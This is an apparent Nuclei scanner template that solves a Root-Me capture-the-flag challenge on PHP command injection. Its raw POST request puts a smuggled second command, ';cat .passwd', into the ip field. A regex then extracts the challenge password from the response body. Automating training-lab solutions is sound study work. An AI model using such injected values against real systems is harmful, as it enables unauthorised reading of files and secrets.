id: PHP-Commandinjection
info:
  author: Tomitom13
  name: PHP - Command injection
  severity: unknown
  tags: command-injection,php,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - S[a-zA-Z0-9!@#$%^&*()_+,.?]+re
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - S[a-zA-Z0-9!@#$%^&*()_+,.?]+re
    type: regex
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Content-Type: application/x-www-form-urlencoded


    ip=%3Bcat+.passwd

    '
